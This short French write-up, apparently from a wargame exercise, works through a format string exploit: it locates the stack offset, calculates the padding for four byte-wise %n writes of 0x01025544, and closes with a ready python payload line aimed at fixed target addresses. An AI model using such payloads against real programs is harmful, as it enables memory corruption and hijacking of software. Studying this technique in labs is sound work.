Localisons l'offset. Il prend 12 %x avant de le voir.
On peux écrire la valeur 0x01025544 sur 4 %n (ecriture) séparer. La stack est arranger de facon a ce qu'on l'écrive sur des bytes individuelles.

Nous pouvons remplir la zone ciblé en little endian tout en gardant a l'esprit que chaque caractere imprimé affecte le reste de la séquence et doit etre pris en compte.

calcul du premier: 0x44 - 0x10 = 0x34(52)
deuxieme: 0x55 - 0x44 = 0x11 (17)
Pour le troisieme, nous allons profiter d'un débordement d'octets pour obtenir le décalage souhaité:
0x102 - 0x55 = 0xad (173)
et le dernier: 0x101 - 0x2 = 0xff (255)

ce qui nous donne:

python -c 'print "\x10\x98\x04\x08" + "\x11\x98\x04\x08" + "\x12\x98\x04\x08" + "\x13\x98\x04\x08" + "%52x%12$n" + "%17x%13$n" + "%173x%14$n" + "%255x%15$n"' > /tmp/jackpot